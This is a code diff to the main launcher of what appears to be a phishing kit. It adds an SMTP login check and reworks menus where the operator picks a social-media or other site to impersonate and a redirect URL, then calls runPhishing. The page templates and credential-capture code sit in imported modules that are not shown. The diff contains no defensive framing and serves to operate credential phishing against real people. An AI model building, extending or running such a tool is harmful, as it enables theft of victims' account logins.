@@ -23,24 +23,68 @@ from core.view import *
 from core.pre import *
 from core.phishingRunner import *
 from core.sites import site
+from smtplib import *
 
 def main():
     head()
     checkEd()    
-    preoption = input(cyan("\n Select an option:\n\n [S] Social Media\n\n [O] Others\n\n SF > "))
-    if preoption.upper() == 'S':
-        for x in range(1, 8):
-            print(cyan('\n [' + str(x) + '] ' + site[str(x)]))
-    else:       
-        for x in range(8, 12):
-            print(cyan('\n [' + str(x) + '] ' + site[str(x)]))
-    option = input(cyan('\n SF > '))
-    print(cyan("\n Insert a custom redirect url: "))
-    custom = input(cyan('\n SF > '))
-    if '://' in custom:
-        pass
-    else:
-        custom = 'http://' + custom
+    try:
+        checkmail()
+    except (SMTPAuthenticationError,ValueError):
+        print(red(' [!] Your authentication failed'))
+    except IndexError:
+        print(red(' [!] this domain is not supported'))
+    
+        
+    social,others = cyan(' [{}{}\n\n'.format(bold((cyan('S'))),cyan(']ocial Media'))),cyan(' [{}{}\n\n'.format(bold((cyan('O'))),cyan(']thers')))
+    preoption = input(cyan('\n Select an option\n\n') + social + others + cyan(' SF > '))
+
+    while True:
+
+        if preoption.upper() == 'S':
+            print('')
+            for x in range(1, 8):
+                print(cyan(' [' + bold(cyan(str(x))) + cyan('] ' + site[str(x)])))
+            while True:
+                try:
+                    option = input(cyan('\n SF > '))
+                    if int(option) in range(1,8):
+                        while True:
+                            custom = input(cyan('\n Insert a custom redirect url: > '))
+                            if not custom:
+                                pass
+                            else:
+                                break
+                    break
+                except ValueError:
+                    pass
+            break
+
+
+        elif preoption.upper() == 'O':       
+            print('')
+            for x in range(8, 12):
+                print(cyan(' [' + bold(cyan(str(x))) + cyan('] ' + site[str(x)])))
+            while True:
+                try:
+                    option = input(cyan('\n SF > '))
+                    if int(option) in range(8,12):
+                        while True:
+                            custom = input(cyan('\n Insert a custom redirect url: > '))
+
+                            if not custom:
+                                pass
+                            else:
+                                break
+                    break
+                except ValueError:
+                    pass
+            break
+        
+        else:
+            preoption = input(cyan(" SF > "))
+    
+    custom = 'http://' + custom if '://' not in custom else custom
     loadModule(site[option])
     runPhishing(site[option], custom)
 
@@ -52,3 +96,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         end()
         exit(0)
+       
